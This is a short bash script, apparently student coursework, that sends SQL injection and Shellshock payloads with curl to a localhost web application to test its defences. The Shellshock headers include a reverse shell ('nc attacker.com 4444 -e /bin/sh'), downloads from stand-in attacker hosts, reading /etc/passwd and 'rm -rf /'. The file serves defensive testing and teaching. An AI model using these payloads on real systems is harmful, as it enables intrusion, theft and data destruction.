#!/bin/bash
# Francesco Chemello  2121346
# Computers and Networks Security

# attack_test.sh
# Simulate various attacks against a web application
# Usage: ./attack_test.sh
# This script is intended for educational purposes only.
# Do not use against any system without permission.

URL="http://localhost:8080"
echo "Attack start$URL"

# Colori per output
GREEN="\e[32m"
RED="\e[31m"
RESET="\e[0m"

function send_attack() {
  echo -e "\n${RED}[Attack $1]${RESET} $2"
  eval "$2"
  echo -e "${GREEN}---- End Attack $1 ----${RESET}\n"
  sleep 1
}

# =======================
# SQL Injection Attacks
# =======================
send_attack 1  "curl -X POST $URL -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=admin' -d 'password=123' -d \"' OR '1'='1\" -i"
send_attack 2  "curl \"$URL/search?q=%27%20OR%201=1--\" -i"
send_attack 3  "curl -H \"Cookie: session=' UNION SELECT NULL,NULL--\" $URL -i"
send_attack 4  "curl -H 'Referer: DROP TABLE users' $URL -i"
send_attack 5  "curl -X POST $URL -H 'Content-Type: application/json' -d '{\"user\":\"test\",\"query\":\"SELECT * FROM users\"}' -i"
send_attack 6  "curl -X POST $URL -d 'username=admin' -d 'password=123' -d \"' OR '1'='1\" -i"
send_attack 7  "curl '$URL/page?id=1+OR+1=1' -i"
send_attack 8  "curl -H 'X-Query: xp_cmdshell' $URL -i"
send_attack 9  "curl -X POST $URL -d 'data=INSERT INTO users VALUES(...)' -i"
send_attack 10 "curl -X POST $URL -d 'search=WHERE 1=0 OR 1=1' -i"

# =======================
# Shellshock Attacks
# =======================
send_attack 11 "curl -A '() { :;}; echo Shellshocked' $URL -i"
send_attack 12 "curl -H 'X-Test: () { :;}; /bin/bash -c \"id\"' $URL -i"
send_attack 13 "curl -H 'User-Agent: () { ignored;}; echo boom' $URL -i"
send_attack 14 "curl -H 'Referer: () { :;}; wget http://evil.com' $URL -i"
send_attack 15 "curl -H 'Cookie: () { :;}; cat /etc/passwd' $URL -i"
send_attack 16 "curl -H 'X-Debug: () { foo;}; rm -rf /' $URL -i"
send_attack 17 "curl -H 'User-Agent: () { :;}; curl http://attacker.com' $URL -i"
send_attack 18 "curl -H 'X-Custom: () { :;}; nc attacker.com 4444 -e /bin/sh' $URL -i"

# =======================
echo -e "\n${GREEN}Attack test complete.${RESET}"
exit 0
# =======================